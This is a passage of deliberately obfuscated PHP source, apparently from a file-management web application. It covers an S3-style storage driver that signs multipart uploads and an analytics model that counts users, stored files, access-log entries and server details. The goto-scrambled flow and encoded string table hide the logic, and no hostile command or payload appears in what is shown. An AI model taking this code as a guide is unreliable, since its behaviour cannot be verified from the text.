$aª×…‹ç¥ç = '') { $BäŠ¡Ê¢¶ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $B³à¥¨‰ğ“ = $this->objectMeta($E¢˜£à‘Íğ); if (!$B³à¥¨‰ğ“) { return !1; } $aª×…‹ç¥ç = $aª×…‹ç¥ç ? $aª×…‹ç¥ç : _get($B³à¥¨‰ğ“, $BäŠ¡Ê¢¶[217]); $aª×…‹ç¥ç = $aª×…‹ç¥ç ? $aª×…‹ç¥ç : _get($B³à¥¨‰ğ“, $BäŠ¡Ê¢¶[207], $BäŠ¡Ê¢¶[43]); return $aª×…‹ç¥ç; } public function uploadFormData($eê¹™È¨¨Ü, $d¶„÷ğ¼ĞÖ = 3600) { $fÕ§è ¶èï =& $_SERVER[çŞáÓæÚô‚Ô‡]; $côÈ£Èæ©ù = $this->pathFather($eê¹™È¨¨Ü); $b½¬¾Ô…î† = $this->client->getHttpUploadPostParams($this->bucket, $côÈ£Èæ©ù, $fÕ§è ¶èï[195], $d¶„÷ğ¼ĞÖ); return array_merge((array) $b½¬¾Ô…î†, array($fÕ§è ¶èï[179] => $this->getHost())); } public function multiUploadFormData($a·ª’ÊªÎø, $FåÈš¹İ³— = 3600) { $BßÚğ‡ë¦ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $f¿êêÖò› = gmdate($BßÚğ‡ë¦[218]); $bÆôÓŞ§Ö = array(); $c ƒ§œ‚¯ = $this->client->getUploadId($this->bucket, $a·ª’ÊªÎø, $bÆôÓŞ§Ö); if (!$c ƒ§œ‚¯) { return !1; } return array($BßÚğ‡ë¦[219] => $c ƒ§œ‚¯, $BßÚğ‡ë¦[179] => $this->getHost() . $BßÚğ‡ë¦[18] . $this->pathEncode($a·ª’ÊªÎø), $BßÚğ‡ë¦[220] => $f¿êêÖò›, $BßÚğ‡ë¦[99] => $a·ª’ÊªÎø); } public function multiUploadAuthData($AáÜÃÍŒ—, $C—ù“¬Øî° = array()) { goto b²íÏßñ¡ç; EƒÎÓÎ¥êà: $B¹ù·Í‚’ = implode($C·ŒÂŞ¿Ûè[11], $D¯Åø‹Ãù¤); $a½†Ÿ•™Ä = base64_encode(hash_hmac($C·ŒÂŞ¿Ûè[227], $B¹ù·Í‚’, $this->secret, !0)); $D­âØ´·²‡ = $C·ŒÂŞ¿Ûè[228] . $this->accessKey . $C·ŒÂŞ¿Ûè[4] . $a½†Ÿ•™Ä; goto A‘âÄƒÖ…ƒ; b²íÏßñ¡ç: $C·ŒÂŞ¿Ûè =& $_SERVER[çŞáÓæÚô‚Ô‡]; $CÕªåê‡Ğ = isset($C—ù“¬Øî°[$C·ŒÂŞ¿Ûè[220]]) ? $C—ù“¬Øî°[$C·ŒÂŞ¿Ûè[220]] : gmdate($C·ŒÂŞ¿Ûè[218]); $fñõÍéçµ’ = isset($C—ù“¬Øî°[$C·ŒÂŞ¿Ûè[170]]) ? $C—ù“¬Øî°[$C·ŒÂŞ¿Ûè[170]] : $C·ŒÂŞ¿Ûè[43]; goto eù´£ Ûº; eù´£ Ûº: $CƒãñìÄ©£ = $C—ù“¬Øî°[$C·ŒÂŞ¿Ûè[99]]; unset($C—ù“¬Øî°[$C·ŒÂŞ¿Ûè[99]]); if (isset($C—ù“¬Øî°[$C·ŒÂŞ¿Ûè[221]])) { $C—ù“¬Øî°[$C·ŒÂŞ¿Ûè[220]] = $CÕªåê‡Ğ; return $this->listUploadParts($CƒãñìÄ©£, $C—ù“¬Øî°); } goto Aá‡‚¥ùØî; Aá‡‚¥ùØî: $D¯Åø‹Ãù¤ = array($C·ŒÂŞ¿Ûè[222], $C·ŒÂŞ¿Ûè[43], $C·ŒÂŞ¿Ûè[126], $C·ŒÂŞ¿Ûè[43], "\x78\55\141\155\x7a\55\x64\x61\x74\x65\x3a{$CÕªåê‡Ğ}", $C·ŒÂŞ¿Ûè[18] . $this->bucket . $C·ŒÂŞ¿Ûè[18] . $this->pathEncode($CƒãñìÄ©£) . $fñõÍéçµ’); if (strpos($fñõÍéçµ’, $C·ŒÂŞ¿Ûè[223]) === 0) { $D¯Åø‹Ãù¤[0] = $C·ŒÂŞ¿Ûè[224]; } if (isset($C—ù“¬Øî°[$C·ŒÂŞ¿Ûè[225]]) && $C—ù“¬Øî°[$C·ŒÂŞ¿Ûè[225]] == $C·ŒÂŞ¿Ûè[226]) { $D¯Åø‹Ãù¤[0] = $C·ŒÂŞ¿Ûè[226]; } goto EƒÎÓÎ¥êà; A‘âÄƒÖ…ƒ: if (strpos($fñõÍéçµ’, $C·ŒÂŞ¿Ûè[223]) === 0) { return array($C·ŒÂŞ¿Ûè[229] => $D­âØ´·²‡, $C·ŒÂŞ¿Ûè[220] => $CÕªåê‡Ğ); } return $D­âØ´·²‡; goto EóˆæœÒÀŸ; EóˆæœÒÀŸ: } public function listUploadParts($FòÛê¥÷·İ, $F¥™ÖºîêÊ = array()) { goto f«„’ø¯ğç; f«„’ø¯ğç: $E­¹È¸…Ë =& $_SERVER[çŞáÓæÚô‚Ô‡]; $aî©š§àêò = str_replace($E­¹È¸…Ë[230], $E­¹È¸…Ë[43], $F¥™ÖºîêÊ[$E­¹È¸…Ë[170]]); $fêÚ›Úâùö = $this->client->listParts($this->bucket, $FòÛê¥÷·İ, $aî©š§àêò); goto eÎëÏÓ­½ë; eÎëÏÓ­½ë: if (!$fêÚ›Úâùö) { return !1; } unset($F¥™ÖºîêÊ[$E­¹È¸…Ë[221]], $F¥™ÖºîêÊ[$E­¹È¸…Ë[225]]); $F¥™ÖºîêÊ[$E­¹È¸…Ë[99]] = $FòÛê¥÷·İ; goto AîÜ©ÍÜÅ¹; AîÜ©ÍÜÅ¹: $dÏ¥Æ•µ¨ = $this->multiUploadAuthData($FòÛê¥÷·İ, $F¥™ÖºîêÊ); if (empty($dÏ¥Æ•µ¨)) { return !1; } return array($E­¹È¸…Ë[229] => $dÏ¥Æ•µ¨, $E­¹È¸…Ë[220] => $F¥™ÖºîêÊ[$E­¹È¸…Ë[220]], $E­¹È¸…Ë[231] => $fêÚ›Úâùö); goto F–ÀÈ—†‚º; F–ÀÈ—†‚º: } public function getHost() { return parent::getHost() . $_SERVER[çŞáÓæÚô‚Ô‡][18] . $this->bucket; } public function size($føƒãÎî±¡) { $B²ãæ²‡¢ = $this->objectMeta($føƒãÎî±¡); return $B²ãæ²‡¢ ? $B²ãæ²‡¢[$_SERVER[çŞáÓæÚô‚Ô‡][87]] : 0; } public function info($B‚³ÓªœÄˆ) { if ($this->isFolder($B‚³ÓªœÄˆ)) { return $this->folderInfo($B‚³ÓªœÄˆ); } else { if ($this->isFile($B‚³ÓªœÄˆ)) { return $this->fileInfo($B‚³ÓªœÄˆ); } } return !1; } public function exist($dæ–‹­§º) { return $this->isFile($dæ–‹­§º) || $this->isFolder($dæ–‹­§º); } public function isFile($D´Ù”Æ“Ôæ) { return !$this->isFolder($D´Ù”Æ“Ôæ) && $this->objectMeta($D´Ù”Æ“Ôæ); } public function isFolder($D©ÎÍ‚¬¯) { return $this->cacheMethod($_SERVER[çŞáÓæÚô‚Ô‡][232], $D©ÎÍ‚¬¯); } protected function objectMeta($dÔæ¢ô·¶è) { return $this->cacheMethod($_SERVER[çŞáÓæÚô‚Ô‡][233], $dÔæ¢ô·¶è); } protected function _objectMeta($e†ïç»†ò) { $A½÷İî›½‹ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $e†ïç»†ò = rtrim($e†ïç»†ò, $A½÷İî›½‹[18]); try { $f·ÃàøùË™ = $this->client->getObjectInfo($this->bucket, $e†ïç»†ò); if (!isset($f·ÃàøùË™[$A½÷İî›½‹[217]]) && isset($f·ÃàøùË™[$A½÷İî›½‹[234]])) { $f·ÃàøùË™[$A½÷İî›½‹[217]] = $f·ÃàøùË™[$A½÷İî›½‹[234]]; } } catch (Exception $C¼‡Öâ™İ) { $f·ÃàøùË™ = !1; } if (!$f·ÃàøùË™) { } return $f·ÃàøùË™; } protected function _isFolder($c…”—Ì°­) { goto CĞ‡Ö‹½½¿; b”ˆ’šíÛ×: $BÏ‚”ø”Ù = $this->client->getBucket($this->bucket, $c…”—Ì°­, null, 1); if (empty($BÏ‚”ø”Ù)) { return !1; } $BÏ‚”ø”Ù = array_values($BÏ‚”ø”Ù); goto eê”´¢ÒÁ; eê”´¢ÒÁ: if (substr($BÏ‚”ø”Ù[0][$B¨İïº¸æ·[38]], -1) == $B¨İïº¸æ·[18]) { return !0; } if (get_path_this($BÏ‚”ø”Ù[0][$B¨İïº¸æ·[38]]) == get_path_this($c…”—Ì°­)) { return !1; } return !0; goto eÄåøİß•´; CĞ‡Ö‹½½¿: $B¨İïº¸æ· =& $_SERVER[çŞáÓæÚô‚Ô‡]; $c…”—Ì°­ = rtrim($c…”—Ì°­, $B¨İïº¸æ·[18]); if ($c…”—Ì°­ == $B¨İïº¸æ·[43] || $c…”—Ì°­ == $B¨İïº¸æ·[18]) { return !0; } goto b”ˆ’šíÛ×; eÄåøİß•´: } } goto aË´Š’ º; FÇÜèäãÏ: class ZipStream { } class AnalysisModel extends ModelBaseLight { public function init($EœãÁà˜ì) { $e¤Ëª…Î« =& $_SERVER[çŞáÓæÚô‚Ô‡]; $a‘Ê¯›Æ´Ä = array($e¤Ëª…Î«[546] => array($e¤Ëª…Î«[39] => $e¤Ëª…Î«[2039], $e¤Ëª…Î«[270] => array($e¤Ëª…Î«[220], $e¤Ëª…Î«[709], $e¤Ëª…Î«[2040], $e¤Ëª…Î«[2041])), $e¤Ëª…Î«[2042] => array($e¤Ëª…Î«[39] => $e¤Ëª…Î«[2043], $e¤Ëª…Î«[270] => array($e¤Ëª…Î«[220], $e¤Ëª…Î«[707], $e¤Ëª…Î«[2044], $e¤Ëª…Î«[2045], $e¤Ëª…Î«[2046]))); if (!isset($a‘Ê¯›Æ´Ä[$EœãÁà˜ì])) { return !1; } $this->optionType = $a‘Ê¯›Æ´Ä[$EœãÁà˜ì][$e¤Ëª…Î«[39]]; $this->field = $a‘Ê¯›Æ´Ä[$EœãÁà˜ì][$e¤Ëª…Î«[270]]; return !0; } public function listData($cºÕë†öà = false, $bÁèŒ®íƒĞ = "\x6d\x6f\x64\151\x66\171\x54\x69\155\145", $B¢®‹ˆÔ©Ç = false) { return parent::listData($cºÕë†öà, $bÁèŒ®íƒĞ, $B¢®‹ˆÔ©Ç); } public function trendList($FƒÄ‘Ş·Ô) { goto eŠ“…Ùİ„ß; FÍˆšÏ›„ø: foreach ($e™Ò¿­ìÛ as $b‹ÍªÓ”…) { $this->{$E‚…É¾â„ó}($b‹ÍªÓ”…); } return $this->listData(); goto Fé½‘ÄÄ¦‰; d›Û·¾Èî: if (!isset($ašÒ»¢•‘İ)) { $e™É¾ˆÀéŒ = $FƒÄ‘Ş·Ô == $döŞÀÑÚ‰·[546] ? $döŞÀÑÚ‰·[488] : $döŞÀÑÚ‰·[761]; $ašÒ»¢•‘İ = Model($e™É¾ˆÀéŒ)->min($döŞÀÑÚ‰·[197]); } $E‚…É¾â„ó = $döŞÀÑÚ‰·[2049] . ucfirst($FƒÄ‘Ş·Ô); $e™Ò¿­ìÛ = $this->dateList($ašÒ»¢•‘İ); goto FÍˆšÏ›„ø; eŠ“…Ùİ„ß: $döŞÀÑÚ‰· =& $_SERVER[çŞáÓæÚô‚Ô‡]; $bâ§À…¥İ = $this->listData(); if ($bâ§À…¥İ) { $cÆŸ‰ÁÚ¥§ = end($bâ§À…¥İ); $b‹ÍªÓ”… = date($döŞÀÑÚ‰·[2047], strtotime($döŞÀÑÚ‰·[2048])); if ($cÆŸ‰ÁÚ¥§[$döŞÀÑÚ‰·[220]] == $b‹ÍªÓ”…) { return $bâ§À…¥İ; } $ašÒ»¢•‘İ = strtotime($cÆŸ‰ÁÚ¥§[$döŞÀÑÚ‰·[220]]); } goto d›Û·¾Èî; Fé½‘ÄÄ¦‰: } private function dateList($cï‰¾†åí¤) { $FÍÓôĞ©Ğ¸ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $dœ¨ß¸Ëçö = $cï‰¾†åí¤; $bˆˆ®´ˆ¿Æ = strtotime($FÍÓôĞ©Ğ¸[2048]); $B©‰µÇŞ„ = array(); while ($dœ¨ß¸Ëçö <= $bˆˆ®´ˆ¿Æ) { $B©‰µÇŞ„[] = date($FÍÓôĞ©Ğ¸[2047], $dœ¨ß¸Ëçö); $dœ¨ß¸Ëçö = strtotime($FÍÓôĞ©Ğ¸[2050], $dœ¨ß¸Ëçö); } return $B©‰µÇŞ„; } public function _recordUser($aÌ‘”Ñˆ’† = '') { goto AÖêİôÕšÒ; a‡„×æì‘§: $a‰¥¼ˆ‚•» = Model($c¶Í™¾Ã¡[488])->where($FË¹‰²¼Ú–)->count($c¶Í™¾Ã¡[1443]); $FË¹‰²¼Ú–[$c¶Í™¾Ã¡[39]] = $c¶Í™¾Ã¡[2053]; $A÷¥½à–Èö = Model($c¶Í™¾Ã¡[2054])->where($FË¹‰²¼Ú–)->count($c¶Í™¾Ã¡[2055]); goto B ¥ª‹»¨; B ¥ª‹»¨: $FœäÏùñ•Ô = array($c¶Í™¾Ã¡[220] => $aÌ‘”Ñˆ’†, $c¶Í™¾Ã¡[709] => (int) $dè³‘ªÇ¼¤, $c¶Í™¾Ã¡[2040] => (int) $a‰¥¼ˆ‚•», $c¶Í™¾Ã¡[2041] => (int) $A÷¥½à–Èö); return $this->insert($FœäÏùñ•Ô); goto CÍŠ…Ö—½ñ; AÖêİôÕšÒ: $c¶Í™¾Ã¡ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $Dé¢§â«İÉ = strtotime(date($c¶Í™¾Ã¡[2051], strtotime($aÌ‘”Ñˆ’†))); $D§Ì’ä¡ùØ = strtotime(date($c¶Í™¾Ã¡[2052], strtotime($aÌ‘”Ñˆ’†))); goto F†ŠÁè•¸; F†ŠÁè•¸: $FË¹‰²¼Ú– = array($c¶Í™¾Ã¡[197] => array($c¶Í™¾Ã¡[933], $D§Ì’ä¡ùØ)); $dè³‘ªÇ¼¤ = Model($c¶Í™¾Ã¡[488])->where($FË¹‰²¼Ú–)->count($c¶Í™¾Ã¡[1443]); $FË¹‰²¼Ú–[$c¶Í™¾Ã¡[197]] = array($c¶Í™¾Ã¡[330], array($Dé¢§â«İÉ, $D§Ì’ä¡ùØ)); goto a‡„×æì‘§; CÍŠ…Ö—½ñ: } public function _recordStore($B“Š·¤©ôÄ = '') { goto fŠ¬£ÁÁö‹; e‚°»¿–¬: $a¥¢•òĞô² = Model($CÔÑ¤âÄè¿[431])->where($EãÓéĞØøÃ)->sum($CÔÑ¤âÄè¿[87]); $EãÓéĞØøÃ[$CÔÑ¤âÄè¿[379]] = 0; $Døø½²…œ = Model($CÔÑ¤âÄè¿[761])->where($EãÓéĞØøÃ)->sum($CÔÑ¤âÄè¿[87]); goto cÒÄÁ½çº¶; fŠ¬£ÁÁö‹: $CÔÑ¤âÄè¿ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $eÍïœìëÇ‚ = strtotime(date($CÔÑ¤âÄè¿[2052], strtotime($B“Š·¤©ôÄ))); $EãÓéĞØøÃ = array($CÔÑ¤âÄè¿[197] => array($CÔÑ¤âÄè¿[933], $eÍïœìëÇ‚)); goto e‚°»¿–¬; bÎ µƒÕÏ•: $eêáÛŒ­Û = Model($CÔÑ¤âÄè¿[761])->where($EãÓéĞØøÃ)->sum($CÔÑ¤âÄè¿[87]); $bãø±éìˆ  = array($CÔÑ¤âÄè¿[220] => $B“Š·¤©ôÄ, $CÔÑ¤âÄè¿[707] => (int) $Døø½²…œ, $CÔÑ¤âÄè¿[2044] => (int) $a¥¢•òĞô², $CÔÑ¤âÄè¿[2045] => (int) $cØïæ¬Ó, $CÔÑ¤âÄè¿[2046] => (int) $eêáÛŒ­Û); return $this->insert($bãø±éìˆ ); goto cŒÔ¹×İÜ–; cÒÄÁ½çº¶: $EãÓéĞØøÃ[$CÔÑ¤âÄè¿[380]] = 1; $cØïæ¬Ó = Model($CÔÑ¤âÄè¿[761])->where($EãÓéĞØøÃ)->sum($CÔÑ¤âÄè¿[87]); $EãÓéĞØøÃ[$CÔÑ¤âÄè¿[380]] = 2; goto bÎ µƒÕÏ•; cŒÔ¹×İÜ–: } public function trend($bÃÜ¶õ„áÖ, $a‚—Ò„İ½¦) { goto e³˜ƒ¬Ç¯Ü; Dù·œ«Šè: return $còÔ¾ÙĞ£¸; goto e…›¹¿ÈÍ°; CÄ™ ù„ÆĞ: if (empty($B¾Ç¨ßÕà)) { $b”ñØ¬±º = date($C—åÇÚ†[2047], strtotime($C—åÇÚ†[2048])); $dˆ·Ë´ë = array($C—åÇÚ†[220] => $b”ñØ¬±º); foreach ($fÔŠšº±œ÷[$bÃÜ¶õ„áÖ] as $F¡«¢ÏËò… => $a—…Š¶±İ) { $dˆ·Ë´ë[$F¡«¢ÏËò…] = 0; } $B¾Ç¨ßÕà[] = $dˆ·Ë´ë; } $còÔ¾ÙĞ£¸ = array(); foreach ($B¾Ç¨ßÕà as $a—…Š¶±İ) { if ($bÃÜ¶õ„áÖ == $C—åÇÚ†[2042] && $a—…Š¶±İ[$C—åÇÚ†[2044]] > $a—…Š¶±İ[$C—åÇÚ†[707]]) { $a—…Š¶±İ[$C—åÇÚ†[2044]] = $a—…Š¶±İ[$C—åÇÚ†[707]]; } foreach ($fÔŠšº±œ÷[$bÃÜ¶õ„áÖ] as $F¡«¢ÏËò… => $C–Ùò¬Õåµ) { $féƒçÕ˜¶Í = array($C—åÇÚ†[220] => $a—…Š¶±İ[$C—åÇÚ†[220]], $C—åÇÚ†[1349] => $C–Ùò¬Õåµ); $féƒçÕ˜¶Í[$DË¡Œ‡ØÑ[$bÃÜ¶õ„áÖ]] = isset($a—…Š¶±İ[$F¡«¢ÏËò…]) ? $a—…Š¶±İ[$F¡«¢ÏËò…] : 0; $còÔ¾ÙĞ£¸[] = $féƒçÕ˜¶Í; } } goto Dù·œ«Šè; e³˜ƒ¬Ç¯Ü: $C—åÇÚ† =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$this->init($bÃÜ¶õ„áÖ)) { return !1; } $B¾Ç¨ßÕà = $this->trendList($bÃÜ¶õ„áÖ); goto CÎñ˜Øºµ; CÎñ˜Øºµ: if ($B¾Ç¨ßÕà && $a‚—Ò„İ½¦ != $C—åÇÚ†[1418]) { $Bòá‡Šùòè = $B¾Ç¨ßÕà[0][$C—åÇÚ†[220]]; $d¸ÁÁºÏğ¢ = $this->validDate($a‚—Ò„İ½¦, $Bòá‡Šùòè); $A­ŠÂ¿´ÆÓ = array(); $e±Ï‹ŠÚ† = array_to_keyvalue($B¾Ç¨ßÕà, $C—åÇÚ†[220]); foreach ($d¸ÁÁºÏğ¢ as $b”ñØ¬±º) { if (isset($e±Ï‹ŠÚ†[$b”ñØ¬±º])) { $féƒçÕ˜¶Í = $e±Ï‹ŠÚ†[$b”ñØ¬±º]; } else { $féƒçÕ˜¶Í = end($B¾Ç¨ßÕà); $féƒçÕ˜¶Í[$C—åÇÚ†[220]] = $b”ñØ¬±º; if ($bÃÜ¶õ„áÖ == $C—åÇÚ†[546]) { $féƒçÕ˜¶Í[$C—åÇÚ†[2040]] = $féƒçÕ˜¶Í[$C—åÇÚ†[2041]] = 0; } } $A­ŠÂ¿´ÆÓ[] = $féƒçÕ˜¶Í; } $B¾Ç¨ßÕà = $A­ŠÂ¿´ÆÓ; } $fÔŠšº±œ÷ = array($C—åÇÚ†[546] => array($C—åÇÚ†[709] => LNG($C—åÇÚ†[2056]), $C—åÇÚ†[2040] => LNG($C—åÇÚ†[2057]), $C—åÇÚ†[2041] => LNG($C—åÇÚ†[2058])), $C—åÇÚ†[2042] => array($C—åÇÚ†[707] => LNG($C—åÇÚ†[2059]), $C—åÇÚ†[2044] => LNG($C—åÇÚ†[2060]), $C—åÇÚ†[2045] => LNG($C—åÇÚ†[2061]), $C—åÇÚ†[2046] => LNG($C—åÇÚ†[2062]))); $DË¡Œ‡ØÑ = array($C—åÇÚ†[546] => $C—åÇÚ†[2063], $C—åÇÚ†[2042] => $C—åÇÚ†[87]); goto CÄ™ ù„ÆĞ; e…›¹¿ÈÍ°: } public function validDate($d±îòƒŞ¼, $c¼óßé‹ÔÂ) { goto bº…ÁÅ°¸¯; bº…ÁÅ°¸¯: $a³É¼ë›Ô¨ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $E²òŒŠÊ£÷ = date($a³É¼ë›Ô¨[2047], strtotime($a³É¼ë›Ô¨[2048])); $A¼„…’ß = array($E²òŒŠÊ£÷); goto dâ‰ÔòÑ¨ß; dâ‰ÔòÑ¨ß: switch ($d±îòƒŞ¼) { case $a³É¼ë›Ô¨[1425]: $aóÖáĞ£¬‘ = mktime(0, 0, 0, date($a³É¼ë›Ô¨[2064]), date($a³É¼ë›Ô¨[2065]) - date($a³É¼ë›Ô¨[1233]) + 7 - 7, date($a³É¼ë›Ô¨[2066])); $C‘ãÎ‡ªõ = 0; do { $AÍ­Äœ»«Ç = date($a³É¼ë›Ô¨[2047], $aóÖáĞ£¬‘ - 3600 * 24 * 7 * $C‘ãÎ‡ªõ); $A¼„…’ß[] = $AÍ­Äœ»«Ç; $C‘ãÎ‡ªõ++; } while ($c¼óßé‹ÔÂ < $AÍ­Äœ»«Ç); break; case $a³É¼ë›Ô¨[1423]: $C‘ãÎ‡ªõ = 1; do { $eœ¸ªÁŞ¸Ñ = date($a³É¼ë›Ô¨[2067], strtotime("\x2d\x20{$C‘ãÎ‡ªõ}\x20\x6d\x6f\x6e\164\x68\163")); $A¼„…’ß[] = $eœ¸ªÁŞ¸Ñ; $C‘ãÎ‡ªõ++; } while ($c¼óßé‹ÔÂ < $eœ¸ªÁŞ¸Ñ); break; case $a³É¼ë›Ô¨[1732]: $aÅ†ŸÆ³ = (int) date($a³É¼ë›Ô¨[2066], strtotime($c¼óßé‹ÔÂ)); $aó¾ˆŠß¹Ç = (int) date($a³É¼ë›Ô¨[2066]); if ($aÅ†ŸÆ³ >= $aó¾ˆŠß¹Ç) { break; } for ($aÅ†ŸÆ³; $aÅ†ŸÆ³ < $aó¾ˆŠß¹Ç; $aÅ†ŸÆ³++) { $A¼„…’ß[] = $aÅ†ŸÆ³ . $a³É¼ë›Ô¨[2068]; } break; default: break; } if ($c¼óßé‹ÔÂ > end($A¼„…’ß)) { array_pop($A¼„…’ß); } sort($A¼„…’ß); goto a¿×·ĞóÑƒ; a¿×·ĞóÑƒ: return $A¼„…’ß; goto e¶Ü´÷Ñ”; e¶Ü´÷Ñ”: } public function listTable($Fà‡ˆë„åí) { $B‚µì…Û¡ = ucfirst($Fà‡ˆë„åí); return Model($B‚µì…Û¡)->listData(); } public function option($FŒÎÒØ½‹Ş) { $a»§²Ñôµ‘ = $_SERVER[çŞáÓæÚô‚Ô‡][2069] . ucfirst($FŒÎÒØ½‹Ş); return $this->{$a»§²Ñôµ‘}(); } private function optionUser() { goto CÆ˜Ã•ñ×†; cáÊóç†¨: $d‡¼£¡˜»î = Model($d½ô©…²ˆ[488])->where($D×‘”æ’ÏÄ)->count($d½ô©…²ˆ[1443]); return array($d½ô©…²ˆ[704] => (int) $C•¢¯–ãôŠ, $d½ô©…²ˆ[2073] => (int) ($C•¢¯–ãôŠ - $f¹š¹Ìó‹Ê), $d½ô©…²ˆ[2074] => (int) $f¹š¹Ìó‹Ê, $d½ô©…²ˆ[2075] => (int) $d‡¼£¡˜»î, $d½ô©…²ˆ[2076] => $d¨ÌïåĞç); goto eÛ™ì’ÅîÊ; CÆ˜Ã•ñ×†: $d½ô©…²ˆ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $C•¢¯–ãôŠ = Model($d½ô©…²ˆ[488])->count($d½ô©…²ˆ[1443]); $f¹š¹Ìó‹Ê = Model($d½ô©…²ˆ[488])->where($d½ô©…²ˆ[2070])->count($d½ô©…²ˆ[1443]); goto fÃƒ‘Ö‰†‹; EÊÜÄÔ™Â: if (!$d¨ÌïåĞç) { $d¨ÌïåĞç = 1; } $c¨¸Š´³Á„ = strtotime(date($d½ô©…²ˆ[2051])); $D×‘”æ’ÏÄ = array($d½ô©…²ˆ[2072] => array($d½ô©…²ˆ[934], $c¨¸Š´³Á„)); goto cáÊóç†¨; fÃƒ‘Ö‰†‹: $c¨¸Š´³Á„ = strtotime($d½ô©…²ˆ[2071]); $D×‘”æ’ÏÄ = array($d½ô©…²ˆ[2072] => array($d½ô©…²ˆ[934], $c¨¸Š´³Á„)); $d¨ÌïåĞç = (int) Model($d½ô©…²ˆ[488])->where($D×‘”æ’ÏÄ)->count($d½ô©…²ˆ[1443]); goto EÊÜÄÔ™Â; eÛ™ì’ÅîÊ: } private function optionFile() { goto d±ñÅˆÏŒÜ; d±ñÅˆÏŒÜ: $EŠõÒÏÕìï =& $_SERVER[çŞáÓæÚô‚Ô‡]; $aíôÇĞ’Ûº = $this->sourceSize(); $då²…„…Ä = $aíôÇĞ’Ûº[$EŠõÒÏÕìï[87]]; goto AµÏ±ğß–Œ; AµÏ±ğß–Œ: $F·ÍÔ‹äğŠ = $aíôÇĞ’Ûº[$EŠõÒÏÕìï[2044]]; $d£¨¸Î«±… = Model($EŠõÒÏÕìï[761])->where(array($EŠõÒÏÕìï[379] => 0))->count($EŠõÒÏÕìï[378]); $c©ÚÓ‰èš¹ = array($EŠõÒÏÕìï[379] => 0, $EŠõÒÏÕìï[197] => array($EŠõÒÏÕìï[934], strtotime(date($EŠõÒÏÕìï[2051])))); goto B›»–Ó–; B›»–Ó–: $fô·ÑóÀš¢ = Model($EŠõÒÏÕìï[761])->where($c©ÚÓ‰èš¹)->sum($EŠõÒÏÕìï[87]); $EíÇÀ‰àã = Model($EŠõÒÏÕìï[761])->where($c©ÚÓ‰èš¹)->count($EŠõÒÏÕìï[378]); return array($EŠõÒÏÕìï[707] => $då²…„…Ä, $EŠõÒÏÕìï[2044] => $F·ÍÔ‹äğŠ, $EŠõÒÏÕìï[2077] => $då²…„…Ä - $F·ÍÔ‹äğŠ, $EŠõÒÏÕìï[2078] => (int) $fô·ÑóÀš¢, $EŠõÒÏÕìï[709] => (int) $d£¨¸Î«±…, $EŠõÒÏÕìï[2079] => (int) $EíÇÀ‰àã); goto d—„·„Çè÷; d—„·„Çè÷: } private function optionAccess() { $c“øÁŠ†…¥ =& $_SERVER[çŞáÓæÚô‚Ô‡]; return array($c“øÁŠ†…¥[704] => $this->typeLogCnt(), $c“øÁŠ†…¥[113] => $this->typeLogCnt($c“øÁŠ†…¥[113]), $c“øÁŠ†…¥[413] => $this->typeLogCnt($c“øÁŠ†…¥[413]), $c“øÁŠ†…¥[2080] => $this->typeLogCnt($c“øÁŠ†…¥[2080]), $c“øÁŠ†…¥[2081] => $this->typeLogCnt($c“øÁŠ†…¥[2081]), $c“øÁŠ†…¥[546] => $this->typeLogCnt($c“øÁŠ†…¥[43], $c“øÁŠ†…¥[2055])); } private function typeLogCnt($b‘ñå¢È = '', $a×…‰µï¯ƒ = "\x69\x64") { goto bÍÓ¬½Ã™â; bÍÓ¬½Ã™â: $F“ÂĞš§Šà =& $_SERVER[çŞáÓæÚô‚Ô‡]; $cƒò¾ÍŸ½ = array($F“ÂĞš§Šà[113] => array($F“ÂĞš§Šà[2082], $F“ÂĞš§Šà[2083]), $F“ÂĞš§Šà[413] => array($F“ÂĞš§Šà[2084], $F“ÂĞš§Šà[2085]), $F“ÂĞš§Šà[2080] => array($F“ÂĞš§Šà[2086], $F“ÂĞš§Šà[2087], $F“ÂĞš§Šà[2088]), $F“ÂĞš§Šà[2081] => array($F“ÂĞš§Šà[2089], $F“ÂĞš§Šà[2090]), $F“ÂĞš§Šà[2091] => array($F“ÂĞš§Šà[2092], $F“ÂĞš§Šà[2093], $F“ÂĞš§Šà[2094])); $f‹®‡±ÓäÛ = strtotime(date($F“ÂĞš§Šà[2051])); goto AŸğÁàÃá; cßã‹‡ÔØê: return (int) $BãÈøÉ‚š¡; goto fõ¨Ñª±ƒ¼; AŸğÁàÃá: $Cê¨“‡º‡ = array($F“ÂĞš§Šà[197] => array($F“ÂĞš§Šà[934], $f‹®‡±ÓäÛ)); if ($b‘ñå¢È) { $Cê¨“‡º‡[$F“ÂĞš§Šà[39]] = array($F“ÂĞš§Šà[17], $cƒò¾ÍŸ½[$b‘ñå¢È]); } $BãÈøÉ‚š¡ = Model($F“ÂĞš§Šà[2054])->where($Cê¨“‡º‡)->count($a×…‰µï¯ƒ); goto cßã‹‡ÔØê; fõ¨Ñª±ƒ¼: } private function optionServer() { goto d ÓÍ’‡; FÙº®ôŠŠØ: return array($Cê®ÇêÕ…±[2097] => $d°†èÚÄ¼Ğ ? $d°†èÚÄ¼Ğ[$Cê®ÇêÕ…±[2098]] : 0, $Cê®ÇêÕ…±[2099] => $d°†èÚÄ¼Ğ ? $d°†èÚÄ¼Ğ[$Cê®ÇêÕ…±[2100]] : 0, $Cê®ÇêÕ…±[2101] => (int) $A´ŒÊó½ù[$Cê®ÇêÕ…±[2098]] * 1024 * 1024 * 1024, $Cê®ÇêÕ…±[2102] => (int) $f‡Ì–Îñë, $Cê®ÇêÕ…±[2103] => ucfirst($cÉÀ§ò¹º), $Cê®ÇêÕ…±[2104] => $Cê®ÇêÕ…±[2105] . PHP_VERSION, $Cê®ÇêÕ…±[2106] => phpBuild64() ? 64 : 32, $Cê®ÇêÕ…±[703] => str_replace($Cê®ÇêÕ…±[2107], $Cê®ÇêÕ…±[910], $dùƒöåÅøî), $Cê®ÇêÕ…±[346] => ucfirst($BÅ†‰ºî·å), $Cê®ÇêÕ…±[38] => $_SERVER[$Cê®ÇêÕ…±[2108]]); goto cëŞ ğ¬Œ; bçØ±ãÉòí: $F—İË°§à = array($Cê®ÇêÕ…±[752] => 